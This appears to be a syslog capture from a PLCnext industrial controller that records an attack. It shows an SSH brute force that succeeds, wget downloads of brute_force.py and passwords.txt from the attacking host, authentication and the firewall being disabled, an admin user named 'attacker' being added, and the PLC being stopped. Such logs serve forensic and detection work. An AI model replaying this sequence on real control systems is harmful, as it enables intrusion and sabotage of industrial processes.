+Aug 24 22:36:44 axcf2152 sshd[14451]: Disconnecting authenticating user engineer 192.168.137.246 port 41538: Too many authentication failures [preauth]
+Aug 24 22:36:44 axcf2152 sshd[14451]: PAM 5 more authentication failures; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.137.246  user=engineer
+Aug 24 22:36:44 axcf2152 sshd[14451]: PAM service(sshd) ignoring max retries; 6 > 3
+Aug 24 22:37:01 axcf2152 bash[14707]: CMD: sudo vim private_file.txt | USER: admin | CWD: /opt/plcnext/master
+Aug 24 22:37:12 axcf2152 sshd[14860]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.137.246  user=engineer
+Aug 24 22:37:12 axcf2152 sshd[14864]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.137.246  user=engineer
+Aug 24 22:37:12 axcf2152 sshd[14863]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.137.246  user=engineer
+Aug 24 22:37:12 axcf2152 sshd[14861]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.137.246  user=engineer
+Aug 24 22:37:14 axcf2152 sshd[14860]: Failed password for engineer from 192.168.137.246 port 60714 ssh2
+Aug 24 22:37:15 axcf2152 sshd[14863]: Failed password for engineer from 192.168.137.246 port 60732 ssh2
+Aug 24 22:37:15 axcf2152 sshd[14864]: Failed password for engineer from 192.168.137.246 port 60742 ssh2
+Aug 24 22:37:15 axcf2152 sshd[14861]: Failed password for engineer from 192.168.137.246 port 60730 ssh2
+Aug 24 22:37:18 axcf2152 sshd[14860]: Failed password for engineer from 192.168.137.246 port 60714 ssh2
+Aug 24 22:37:18 axcf2152 sshd[14863]: Failed password for engineer from 192.168.137.246 port 60732 ssh2
+Aug 24 22:37:18 axcf2152 sshd[14864]: Failed password for engineer from 192.168.137.246 port 60742 ssh2
+Aug 24 22:37:18 axcf2152 sshd[14861]: Failed password for engineer from 192.168.137.246 port 60730 ssh2
+Aug 24 22:37:20 axcf2152 sshd[14864]: Failed password for engineer from 192.168.137.246 port 60742 ssh2
+Aug 24 22:37:20 axcf2152 sshd[14863]: Failed password for engineer from 192.168.137.246 port 60732 ssh2
+Aug 24 22:37:20 axcf2152 sshd[14861]: Failed password for engineer from 192.168.137.246 port 60730 ssh2
+Aug 24 22:37:20 axcf2152 sshd[14860]: Failed password for engineer from 192.168.137.246 port 60714 ssh2
+Aug 24 22:37:23 axcf2152 sshd[14863]: Failed password for engineer from 192.168.137.246 port 60732 ssh2
+Aug 24 22:37:23 axcf2152 sshd[14864]: Failed password for engineer from 192.168.137.246 port 60742 ssh2
+Aug 24 22:37:23 axcf2152 sshd[14861]: Failed password for engineer from 192.168.137.246 port 60730 ssh2
+Aug 24 22:37:23 axcf2152 bash[14933]: CMD: ls | USER: admin | CWD: /opt/plcnext/master
+Aug 24 22:37:23 axcf2152 sshd[14863]: Accepted password for engineer from 192.168.137.246 port 60732 ssh2
+Aug 24 22:37:23 axcf2152 sshd[14863]: pam_unix(sshd:session): session opened for user engineer(uid=5000) by (uid=0)
+Aug 24 22:37:23 axcf2152 sshd[14863]: pam_unix(sshd:session): session closed for user engineer
+Aug 24 22:37:24 axcf2152 sshd[14860]: Failed password for engineer from 192.168.137.246 port 60714 ssh2
+Aug 24 22:37:25 axcf2152 sshd[14860]: Connection closed by authenticating user engineer 192.168.137.246 port 60714 [preauth]
+Aug 24 22:37:25 axcf2152 sshd[14860]: PAM 3 more authentication failures; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.137.246  user=engineer
+Aug 24 22:37:25 axcf2152 sshd[14860]: PAM service(sshd) ignoring max retries; 4 > 3
+Aug 24 22:37:25 axcf2152 sshd[14864]: Failed password for engineer from 192.168.137.246 port 60742 ssh2
+Aug 24 22:37:25 axcf2152 sshd[14861]: Failed password for engineer from 192.168.137.246 port 60730 ssh2
+Aug 24 22:37:25 axcf2152 sshd[14864]: Connection closed by authenticating user engineer 192.168.137.246 port 60742 [preauth]
+Aug 24 22:37:25 axcf2152 sshd[14864]: PAM 4 more authentication failures; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.137.246  user=engineer
+Aug 24 22:37:25 axcf2152 sshd[14864]: PAM service(sshd) ignoring max retries; 5 > 3
+Aug 24 22:37:25 axcf2152 sshd[14861]: Connection closed by authenticating user engineer 192.168.137.246 port 60730 [preauth]
+Aug 24 22:37:25 axcf2152 sshd[14861]: PAM 4 more authentication failures; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.137.246  user=engineer
+Aug 24 22:37:25 axcf2152 sshd[14861]: PAM service(sshd) ignoring max retries; 5 > 3
+Aug 24 22:38:19 axcf2152 sudo:    admin : TTY=pts/2 ; PWD=/opt/plcnext/master ; USER=root ; COMMAND=/usr/bin/vim private_file.txt
+Aug 24 22:38:28 axcf2152 root: [2024-08-24 22:38:28] File /opt/plcnext/master/.private_file.txt.swp was accessed by user USER (PID: PID, Command: COMMAND)
+Aug 24 22:38:29 axcf2152 root: [2024-08-24 22:38:29] File /opt/plcnext/master/.private_file.txt.swp was accessed by user root (PID: 15334, Command: vim)
+Aug 24 22:39:40 axcf2152 bash[16011]: CMD: wget https://bootstrap.pypa.io/get-pip.py | USER: admin | CWD: /opt/plcnext/master
+Aug 24 22:39:09 axcf2152 bash[15778]: CMD: sudo vim private_file.txt | USER: admin | CWD: /opt/plcnext/master/php_app
+Aug 24 22:39:14 axcf2152 bash[15784]: CMD: sudo vim private_file.txt | USER: admin | CWD: /opt/plcnext/master/php_app
+Aug 24 22:39:15 axcf2152 bash[15790]: CMD: sudo vim private_file.txt | USER: admin | CWD: /opt/plcnext/master/php_app
+Aug 24 22:39:15 axcf2152 bash[15796]: CMD: sudo vim private_file.txt | USER: admin | CWD: /opt/plcnext/master/php_app
+Aug 24 22:39:31 axcf2152 bash[15929]: CMD: ls | USER: admin | CWD: /opt/plcnext/master/php_app
+Aug 24 22:39:35 axcf2152 bash[15935]: CMD: cd .. | USER: admin | CWD: /opt/plcnext/master
+Aug 24 22:39:35 axcf2152 bash[15942]: CMD: ls | USER: admin | CWD: /opt/plcnext/master
+Aug 24 22:39:40 axcf2152 bash[16011]: CMD: wget https://bootstrap.pypa.io/get-pip.py | USER: admin | CWD: /opt/plcnext/master
+Aug 24 22:40:16 axcf2152 bash[16291]: CMD: mkdir packages | USER: admin | CWD: /opt/plcnext/master
+Aug 24 22:40:18 axcf2152 bash[16298]: CMD: ls | USER: admin | CWD: /opt/plcnext/master
+Aug 24 22:40:30 axcf2152 bash[16429]: CMD: cd packages | USER: admin | CWD: /opt/plcnext/master/packages
+Aug 24 22:40:40 axcf2152 bash[16439]: CMD: pip download python-pam | USER: admin | CWD: /opt/plcnext/master/packages
+Aug 24 22:42:19 axcf2152 bash[17242]: CMD: wget http://192.168.137.246/python_pam-2.0.2-py3-none-any.whl | USER: admin | CWD: /opt/plcnext/master/packages
+Aug 24 22:42:22 axcf2152 bash[17249]: CMD: ls | USER: admin | CWD: /opt/plcnext/master/packages
+Aug 24 22:44:13 axcf2152 bash[18110]: CMD: wget http://192.168.137.246/brute_force.py | USER: admin | CWD: /opt/plcnext/master/packages
+Aug 24 22:44:37 axcf2152 bash[18244]: CMD: wget http://192.168.137.246/passwords.txt | USER: admin | CWD: /opt/plcnext/master/packages
+Aug 24 22:44:39 axcf2152 bash[18251]: CMD: ls | USER: admin | CWD: /opt/plcnext/master/packages
+Aug 24 22:45:09 axcf2152 bash[18527]: CMD: cd .. | USER: admin | CWD: /opt/plcnext/master
+Aug 24 22:45:10 axcf2152 bash[18534]: CMD: ls | USER: admin | CWD: /opt/plcnext/master
+Aug 24 22:45:27 axcf2152 bash[18659]: CMD: mv get-pip.py packages | USER: admin | CWD: /opt/plcnext/master
+Aug 24 22:45:31 axcf2152 bash[18672]: CMD: cd packages | USER: admin | CWD: /opt/plcnext/master/packages
+Aug 24 22:45:33 axcf2152 bash[18679]: CMD: ls | USER: admin | CWD: /opt/plcnext/master/packages
+Aug 24 22:46:33 axcf2152 bash[19148]: CMD: python3 get-pip.py --no-index --find-links . | USER: admin | CWD: /opt/plcnext/master/packages
+Aug 24 22:46:42 axcf2152 bash[19213]: CMD: cd .. | USER: admin | CWD: /opt/plcnext/master
+Aug 24 22:46:43 axcf2152 bash[19220]: CMD: ls | USER: admin | CWD: /opt/plcnext/master
+Aug 24 22:49:31 axcf2152 root: [2024-08-24 22:49:31] File /opt/plcnext/master/.private_file.txt.swp was accessed by user USER (PID: PID, Command: COMMAND)
+Aug 24 22:49:32 axcf2152 root: [2024-08-24 22:49:31] File /opt/plcnext/master/.private_file.txt.swp was accessed by user root (PID: 19281, Command: vim)
+Aug 24 22:50:32 axcf2152 root: [2024-08-24 22:50:32] File /opt/plcnext/master/.private_file.txt.swp was accessed by user USER (PID: PID, Command: COMMAND)
+Aug 24 22:50:32 axcf2152 root: [2024-08-24 22:50:32] File /opt/plcnext/master/.private_file.txt.swp was accessed by user root (PID: 19281, Command: vim)
+Aug 24 22:51:33 axcf2152 root: [2024-08-24 22:51:33] File /opt/plcnext/master/.private_file.txt.swp was accessed by user USER (PID: PID, Command: COMMAND)
+Aug 24 22:51:33 axcf2152 root: [2024-08-24 22:51:33] File /opt/plcnext/master/.private_file.txt.swp was accessed by user root (PID: 19281, Command: vim)
+Aug 24 22:52:34 axcf2152 root: [2024-08-24 22:52:34] File /opt/plcnext/master/.private_file.txt.swp was accessed by user USER (PID: PID, Command: COMMAND)
+Aug 24 22:52:34 axcf2152 root: [2024-08-24 22:52:34] File /opt/plcnext/master/.private_file.txt.swp was accessed by user root (PID: 19281, Command: vim)
+Aug 24 22:53:34 axcf2152 root: [2024-08-24 22:53:34] File /opt/plcnext/master/.private_file.txt.swp was accessed by user USER (PID: PID, Command: COMMAND)
+Aug 24 22:53:34 axcf2152 root: [2024-08-24 22:53:34] File /opt/plcnext/master/.private_file.txt.swp was accessed by user root (PID: 19281, Command: vim)
+Aug 24 22:54:35 axcf2152 root: [2024-08-24 22:54:35] File /opt/plcnext/master/.private_file.txt.swp was accessed by user USER (PID: PID, Command: COMMAND)
+Aug 24 22:54:35 axcf2152 root: [2024-08-24 22:54:35] File /opt/plcnext/master/.private_file.txt.swp was accessed by user root (PID: 19281, Command: vim)
+Aug 24 22:55:35 axcf2152 root: [2024-08-24 22:55:35] File /opt/plcnext/master/.private_file.txt.swp was accessed by user USER (PID: PID, Command: COMMAND)
+Aug 24 22:55:35 axcf2152 root: [2024-08-24 22:55:35] File /opt/plcnext/master/.private_file.txt.swp was accessed by user root (PID: 19281, Command: vim)
+Aug 24 22:56:36 axcf2152 root: [2024-08-24 22:56:36] File /opt/plcnext/master/.private_file.txt.swp was accessed by user USER (PID: PID, Command: COMMAND)
+Aug 24 22:56:36 axcf2152 root: [2024-08-24 22:56:36] File /opt/plcnext/master/.private_file.txt.swp was accessed by user root (PID: 19281, Command: vim)
+Aug 24 22:58:37 axcf2152 root: [2024-08-24 22:58:37] File /opt/plcnext/master/.private_file.txt.swp was accessed by user USER (PID: PID, Command: COMMAND)
+Aug 24 22:58:37 axcf2152 root: [2024-08-24 22:58:37] File /opt/plcnext/master/.private_file.txt.swp was accessed by user root (PID: 19281, Command: vim)
+Aug 24 22:57:36 axcf2152 root: [2024-08-24 22:57:36] File /opt/plcnext/master/.private_file.txt.swp was accessed by user USER (PID: PID, Command: COMMAND)
+Aug 24 22:57:36 axcf2152 root: [2024-08-24 22:57:36] File /opt/plcnext/master/.private_file.txt.swp was accessed by user root (PID: 19281, Command: vim)
+Aug 24 22:59:37 axcf2152 root: [2024-08-24 22:59:37] File /opt/plcnext/master/.private_file.txt.swp was accessed by user USER (PID: PID, Command: COMMAND)
+Aug 24 22:59:37 axcf2152 root: [2024-08-24 22:59:37] File /opt/plcnext/master/.private_file.txt.swp was accessed by user root (PID: 19281, Command: vim)
+Aug 24 23:00:38 axcf2152 root: [2024-08-24 23:00:38] File /opt/plcnext/master/.private_file.txt.swp was accessed by user USER (PID: PID, Command: COMMAND)
+Aug 24 23:00:38 axcf2152 root: [2024-08-24 23:00:38] File /opt/plcnext/master/.private_file.txt.swp was accessed by user root (PID: 19281, Command: vim)
+Aug 24 23:01:38 axcf2152 root: [2024-08-24 23:01:38] File /opt/plcnext/master/.private_file.txt.swp was accessed by user USER (PID: PID, Command: COMMAND)
+Aug 24 23:01:38 axcf2152 root: [2024-08-24 23:01:38] File /opt/plcnext/master/.private_file.txt.swp was accessed by user root (PID: 19281, Command: vim)
+
+Aug 24 23:01:02 axcf2152 syslog-ng[1320]: WARNING: Configuration file format is too old, syslog-ng is running in compatibility mode. Please update it to use the syslog-ng 3.36 format at your time of convenience. To upgrade the configuration, please review the warnings about incompatible changes printed by syslog-ng, and once completed change the @version header at the top of the configuration file; config-version='3.24'
+Aug 24 23:01:02 axcf2152 syslog-ng[1320]: Configuration reload request received, reloading configuration;
+Aug 24 23:01:02 axcf2152 sudo:     root : PWD=/home/root ; USER=root ; COMMAND=/usr/bin/du -sh /etc/crontab
+Aug 24 23:01:02 axcf2152 syslog-ng[1320]: Configuration reload finished;
+Aug 24 23:01:03 axcf2152 syslog-ng[1320]: WARNING: Configuration file format is too old, syslog-ng is running in compatibility mode. Please update it to use the syslog-ng 3.36 format at your time of convenience. To upgrade the configuration, please review the warnings about incompatible changes printed by syslog-ng, and once completed change the @version header at the top of the configuration file; config-version='3.24'
+Aug 24 23:01:03 axcf2152 syslog-ng[1320]: Configuration reload request received, reloading configuration;
+Aug 24 23:01:03 axcf2152 syslog-ng[1320]: Configuration reload finished;
+Aug 24 23:01:03 axcf2152 syslog-ng[1320]: WARNING: Configuration file format is too old, syslog-ng is running in compatibility mode. Please update it to use the syslog-ng 3.36 format at your time of convenience. To upgrade the configuration, please review the warnings about incompatible changes printed by syslog-ng, and once completed change the @version header at the top of the configuration file; config-version='3.24'
+Aug 24 23:01:03 axcf2152 syslog-ng[1320]: Configuration reload request received, reloading configuration;
+Aug 24 23:01:03 axcf2152 syslog-ng[1320]: Configuration reload finished;
+Aug 24 23:05:04 axcf2152 nginx: 192.168.137.50 - - [24/Aug/2024:23:05:04 +0000] "GET /favicon.ico HTTP/1.1" 404 548 "https://192.168.137.10/redirect/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36" "-"
+Aug 24 23:05:20 axcf2152 Arp.System.Application: Session created. User: engineer, User roles: Admin SecurityAdmin SecurityAuditor , Security Token: 2F9A3070, Object name: Wbm, currently opened Sessions 2 
+Aug 24 23:05:21 axcf2152 Arp.System.Application: Arp.Device.Interface.Internal.DeviceStatus WARN - DeviceStatus: Ident "Status.Fan.Supported" not found
+Aug 24 23:05:37 axcf2152 Arp.System.Application: Set rules for chain plcnext_basic_filter in table plcnext_filter
+Aug 24 23:05:37 axcf2152 Arp.System.Application: Set rules for chain plcnext_user_input in table plcnext_filter
+Aug 24 23:05:37 axcf2152 Arp.System.Application: Set rules for chain plcnext_user_output in table plcnext_filter
+Aug 24 23:05:37 axcf2152 Arp.System.Application: Firewall config applied via Firewall Daemon
+Aug 24 23:05:54 axcf2152 Arp.System.Application: Firewall run status changed to Started
+Aug 24 23:05:55 axcf2152 Arp.System.Application: Set rules for chain plcnext_basic_filter in table plcnext_filter
+Aug 24 23:05:55 axcf2152 Arp.System.Application: Set rules for chain plcnext_user_input in table plcnext_filter
+Aug 24 23:05:55 axcf2152 Arp.System.Application: Set rules for chain plcnext_user_output in table plcnext_filter
+Aug 24 23:05:55 axcf2152 Arp.System.Application: Firewall config applied via Firewall Daemon
+Aug 24 23:06:03 axcf2152 Arp.System.Application: Firewall run status changed to Stopped
+Aug 24 23:06:03 axcf2152 Arp.System.Application: Set rules for chain plcnext_basic_filter in table plcnext_filter
+Aug 24 23:06:03 axcf2152 Arp.System.Application: Set rules for chain plcnext_user_input in table plcnext_filter
+Aug 24 23:06:03 axcf2152 Arp.System.Application: Set rules for chain plcnext_user_output in table plcnext_filter
+Aug 24 23:06:03 axcf2152 Arp.System.Application: Firewall config applied via Firewall Daemon
+Aug 24 23:06:22 axcf2152 Arp.System.Application: User Authentication disabled. Current Security Token: 00000000
+Aug 24 23:06:46 axcf2152 Arp.System.Application: User attacker added. Current Security Token: 00000000
+Aug 24 23:07:01 axcf2152 root: [2024-08-24 23:07:01] Firewall settings have changed. Firewall status: OFF
+Aug 24 23:07:01 axcf2152 root: [2024-08-24 23:07:01] Script Modified: /etc/plcnext/plcnext_users.sqlite | Owner: plcnext_firmware | Group: plcnext_firmware | Size: 32768 bytes | Last Modified: 2024-08-24 23:06:46.840000000 +0000
+Aug 24 23:07:02 axcf2152 root: [2024-08-24 23:07:01] Script Modified: /etc/plcnext/plcnext_shadow.sqlite | Owner: plcnext_firmware | Group: plcnext_firmware | Size: 12288 bytes | Last Modified: 2024-08-24 23:06:46.820000000 +0000
+Aug 24 23:07:02 axcf2152 root: [2024-08-24 23:07:02] Script Modified: /etc/plcnext/plcnext_firewall_rules.sqlite | Owner: plcnext_firmware | Group: plcnext_firmware | Size: 32768 bytes | Last Modified: 2024-08-24 23:06:03.630000000 +0000
+Aug 24 23:07:04 axcf2152 Arp.System.Application: Ruleset for User attacker was changed to admin by Security Token : 00000000
+
+Aug 24 23:07:05 axcf2152 Arp.System.Application: Arp.Device.Interface.Internal.DeviceStatus WARN - DeviceStatus: Ident "Status.Fan.Supported" not found
+Aug 24 23:07:38 axcf2152 Arp.System.Application: Arp.Plc.Domain.Internal.PlcManager INFO - PlcManager::StopPlc(stopReason=SystemTerminate,onError=false,onFatalError=false,async=false), current PlcState=Running
+Aug 24 23:07:38 axcf2152 Arp.System.Application: Stopping PLC. Used Memory: 97%, CPUs load: (CPU 0: 14 %,CPU 1: 18 %), Temperatures: (Board Temperature: 56.668 C, CPU Temperature: Not available, LastSensor Temperature: Not available)
+Aug 24 23:07:39 axcf2152 Arp.System.Application: Arp.Services.DataLogger.Internal.Session INFO - Session 'DB_name': Session stopped logging.
+Aug 24 23:07:39 axcf2152 Arp.System.Application: Arp.Services.DataLogger.Internal.Session INFO - Session 'Sec_log': Session stopped logging.
+Aug 24 23:07:39 axcf2152 Arp.System.Application: Retain data saved
+Aug 24 23:07:39 axcf2152 Arp.System.Application: Arp.Io.EthernetIP.EthernetIPComponent INFO - StopPlc
+Aug 24 23:07:39 axcf2152 Arp.System.Application: Arp.Io.EthernetIP.EthernetIPComponent INFO - 2945434432 OnPlcStopped 
+Aug 24 23:07:39 axcf2152 Arp.System.Application: Arp.Io.Axioline.Internal.AxioDataExchange INFO - AxioDataExchange: PD disabled
+Aug 24 23:07:39 axcf2152 Arp.System.Application: Arp.Plc.Domain.Internal.PlcManager INFO - Plc state transition from 'Running' to 'Stop|Hot'
+Aug 24 23:07:39 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.ApplicationBase INFO - Application 'MainProcess' terminates.
+Aug 24 23:07:39 axcf2152 Arp.System.Application: Session with security Token 2F9A3070 was closed , currently are 1 sessions active
+Aug 24 23:07:39 axcf2152 nginx: 2024/08/24 23:07:39 [error] 1545#1545: *520 connect() failed (111: Connection refused) while connecting to upstream, client: 192.168.137.50, server: , request: "POST /wbm/IsSessionValid.cgi? HTTP/1.1", upstream: "fastcgi://127.0.0.1:9001", host: "192.168.137.10", referrer: "https://192.168.137.10/wbm/Main.html"
+Aug 24 23:07:40 axcf2152 Arp.System.Application: Arp.Services.OpcUAServer.OpcUAServerComponent INFO - Stopped OPC UA Server successfully.
+Aug 24 23:07:40 axcf2152 Arp.System.Application: Arp.Services.Ehmi.EhmiComponent INFO - 3069284384   Stop 
+Aug 24 23:07:40 axcf2152 Arp.System.Application: Arp.Services.PLCnextStore.Internal.PLCnextStoreAdapter INFO - Stopped PLCnext-Store service
+Aug 24 23:07:41 axcf2152 nginx: 2024/08/24 23:07:41 [error] 1545#1545: *520 connect() failed (111: Connection refused) while connecting to upstream, client: 192.168.137.50, server: , request: "POST /wbm/PlcValues.cgi?projectname HTTP/1.1", upstream: "fastcgi://127.0.0.1:9001", host: "192.168.137.10", referrer: "https://192.168.137.10/wbm/Main.html"
+Aug 24 23:07:41 axcf2152 sudo: plcnext_firmware : PWD=/var/volatile/tmp ; USER=root ; COMMAND=/etc/init.d/watchdog stop 1813
+Aug 24 23:07:41 axcf2152 watchdog[1813]: stopping daemon (5.16)
+Aug 24 23:07:41 axcf2152 nginx: 2024/08/24 23:07:41 [error] 1545#1545: *520 connect() failed (111: Connection refused) while connecting to upstream, client: 192.168.137.50, server: , request: "POST /wbm/IsSessionValid.cgi? HTTP/1.1", upstream: "fastcgi://127.0.0.1:9001", host: "192.168.137.10", referrer: "https://192.168.137.10/wbm/Main.html"
+Aug 24 23:07:42 axcf2152 root: [2024-08-24 23:07:42] File /opt/plcnext/master/.private_file.txt.swp was accessed by user USER (PID: PID, Command: COMMAND)
+Aug 24 23:07:42 axcf2152 root: [2024-08-24 23:07:42] File /opt/plcnext/master/.private_file.txt.swp was accessed by user root (PID: 19281, Command: vim)
+Aug 24 23:07:42 axcf2152 Arp.System.Application: Arp.Io.EthernetIP.EthernetIPComponent INFO - ResetPlc, isChanging=false
+Aug 24 23:07:42 axcf2152 Arp.System.Application: Arp.Io.EthernetIP.EthernetIPComponent INFO - 2945434432 OnPlcUnloaded PlcLoaded=true
+Aug 24 23:07:42 axcf2152 Arp.System.Application: Arp.Io.EthernetIP.EthernetIPComponent INFO - 2945434432 ESDK 0xffff, RemoveAllAssemblies
+Aug 24 23:07:42 axcf2152 Arp.System.Application: Arp.Io.EthernetIP.EthernetIPComponent INFO - UnloadPlc, isChanging=false
+Aug 24 23:07:42 axcf2152 Arp.System.Application: Arp.Io.EthernetIP.EthernetIPComponent INFO - 2945434432 OnPlcUnloaded PlcLoaded=false
+Aug 24 23:07:43 axcf2152 Arp.System.Application: Arp.Plc.Domain.Internal.PlcManager INFO - Plc state transition from 'Stop|Hot' to 'Ready'
+Aug 24 23:07:43 axcf2152 nginx: 2024/08/24 23:07:43 [error] 1545#1545: *520 connect() failed (111: Connection refused) while connecting to upstream, client: 192.168.137.50, server: , request: "POST /wbm/IsSessionValid.cgi? HTTP/1.1", upstream: "fastcgi://127.0.0.1:9001", host: "192.168.137.10", referrer: "https://192.168.137.10/wbm/Main.html"
+Aug 24 23:07:43 axcf2152 Arp.System.Application: ehmiLib.EhmiLib INFO - 3069284384   Uninitialize 
+Aug 24 23:07:43 axcf2152 Arp.System.Application: Arp.Io.ProfinetStack.Controller.Internal.Controller INFO - Controller instance removed successfully
+Aug 24 23:07:43 axcf2152 Arp.System.Application: Arp.Io.ProfinetStack.Device.Internal.Device INFO - PN_RemoveDevInst with Id = 1!
+Aug 24 23:07:45 axcf2152 nginx: 2024/08/24 23:07:45 [error] 1545#1545: *520 connect() failed (111: Connection refused) while connecting to upstream, client: 192.168.137.50, server: , request: "POST /wbm/IsSessionValid.cgi? HTTP/1.1", upstream: "fastcgi://127.0.0.1:9001", host: "192.168.137.10", referrer: "https://192.168.137.10/wbm/Main.html"
+Aug 24 23:07:46 axcf2152 nginx: 2024/08/24 23:07:46 [error] 1545#1545: *520 connect() failed (111: Connection refused) while connecting to upstream, client: 192.168.137.50, server: , request: "POST /wbm/PlcValues.cgi?projectname HTTP/1.1", upstream: "fastcgi://127.0.0.1:9001", host: "192.168.137.10", referrer: "https://192.168.137.10/wbm/Main.html"
+Aug 24 23:07:47 axcf2152 nginx: 2024/08/24 23:07:47 [error] 1545#1545: *520 connect() failed (111: Connection refused) while connecting to upstream, client: 192.168.137.50, server: , request: "POST /wbm/IsSessionValid.cgi? HTTP/1.1", upstream: "fastcgi://127.0.0.1:9001", host: "192.168.137.10", referrer: "https://192.168.137.10/wbm/Main.html"
+Aug 24 23:07:49 axcf2152 nginx: 2024/08/24 23:07:49 [error] 1545#1545: *520 connect() failed (111: Connection refused) while connecting to upstream, client: 192.168.137.50, server: , request: "POST /wbm/IsSessionValid.cgi? HTTP/1.1", upstream: "fastcgi://127.0.0.1:9001", host: "192.168.137.10", referrer: "https://192.168.137.10/wbm/Main.html"
+Aug 24 23:07:54 axcf2152 su[29247]: Successful su for plcnext_firmware by root
+Aug 24 23:07:54 axcf2152 su[29247]: + ??? root:plcnext_firmware
+Aug 24 23:07:54 axcf2152 su[29247]: pam_unix(su:session): session opened for user plcnext_firmware(uid=1001) by (uid=0)
+Aug 24 23:07:54 axcf2152 su[29247]: pam_unix(su:session): session closed for user plcnext_firmware
+Aug 24 23:07:54 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.ApplicationBase INFO - ArpVersion: 2022.9.0 (22.9.0.33)
+Aug 24 23:07:54 axcf2152 Arp.System.Application: CommonRemoting INFO - [IpcRemotingBroker]: Starting IPC Remoting Broker
+Aug 24 23:07:54 axcf2152 Arp.System.Application: CommonRemoting INFO - Starting remoting server (version=4)
+Aug 24 23:07:54 axcf2152 Arp.System.Application: CommonRemoting INFO - Start listening on IPC *
+Aug 24 23:07:54 axcf2152 Arp.System.Application: CommonRemoting INFO - Start listening on TCP port 41120
+Aug 24 23:07:54 axcf2152 Arp.System.Application: CommonRemoting INFO - Start listening on IPC MainProcess
+Aug 24 23:07:54 axcf2152 Arp.System.Application: CommonRemoting INFO - Start listening on TCP port 41121
+Aug 24 23:07:54 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Process 'MainProcess' started successfully.
+Aug 24 23:07:55 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.ApplicationBase INFO - ArpVersion: 2022.9.0 (22.9.0.33)
+Aug 24 23:07:55 axcf2152 Arp.System.Application: CommonRemoting INFO - Starting remoting server (version=4)
+Aug 24 23:07:55 axcf2152 Arp.System.Application: CommonRemoting INFO - Start listening on IPC LocalIoProcess
+Aug 24 23:07:55 axcf2152 Arp.System.Application: CommonRemoting INFO - Start listening on TCP port 41124
+Aug 24 23:07:55 axcf2152 Arp.System.Application: CommonRemoting INFO - Accepted connection #0: connectionId=AE2F09FB, ipc://<unknown>
+Aug 24 23:07:55 axcf2152 Arp.System.Application: CommonRemoting INFO - Accepted connection #1: connectionId=AE5F1233, ipc://<unknown>
+Aug 24 23:07:55 axcf2152 Arp.System.Application: CommonRemoting INFO - Accepted connection #0: connectionId=AE3F034B, ipc://<unknown>
+Aug 24 23:07:55 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.ApplicationBase INFO - Application 'LocalIoProcess' was setup successfully.
+Aug 24 23:07:55 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.ApplicationBase INFO - ArpVersion: 2022.9.0 (22.9.0.33)
+Aug 24 23:07:55 axcf2152 Arp.System.Application: CommonRemoting INFO - Starting remoting server (version=4)
+Aug 24 23:07:55 axcf2152 Arp.System.Application: CommonRemoting INFO - Start listening on IPC ExternalIoProcess
+Aug 24 23:07:55 axcf2152 Arp.System.Application: CommonRemoting INFO - Start listening on TCP port 41123
+Aug 24 23:07:55 axcf2152 Arp.System.Application: CommonRemoting INFO - Accepted connection #2: connectionId=AE2F2C9B, ipc://<unknown>
+Aug 24 23:07:55 axcf2152 Arp.System.Application: CommonRemoting INFO - Accepted connection #3: connectionId=AE5F369B, ipc://<unknown>
+Aug 24 23:07:55 axcf2152 Arp.System.Application: CommonRemoting INFO - Accepted connection #0: connectionId=AE2F070B, ipc://<unknown>
+Aug 24 23:07:55 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.ApplicationBase INFO - Application 'ExternalIoProcess' was setup successfully.
+Aug 24 23:07:55 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Process 'ExternalIoProcess' started successfully.
+Aug 24 23:07:55 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Process 'LocalIoProcess' started successfully.
+Aug 24 23:07:56 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.Io.EthernetIP.Library' in process 'ExternalIoProcess' loaded.
+Aug 24 23:07:56 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.Io.Profinet.Library' in process 'ExternalIoProcess' loaded.
+Aug 24 23:07:56 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.Plc.Domain.Library' in process 'ExternalIoProcess' loaded.
+Aug 24 23:07:56 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.System.UmRscAuthorizator.Library' in process 'ExternalIoProcess' loaded.
+Aug 24 23:07:56 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.Io.Axioline.Library' in process 'LocalIoProcess' loaded.
+Aug 24 23:07:56 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.Plc.Domain.Library' in process 'LocalIoProcess' loaded.
+Aug 24 23:07:56 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.System.UmRscAuthorizator.Library' in process 'LocalIoProcess' loaded.
+Aug 24 23:07:56 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.Device.HmiLed.Library' in process 'MainProcess' loaded.
+Aug 24 23:07:56 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.Device.Interface.Library' in process 'MainProcess' loaded.
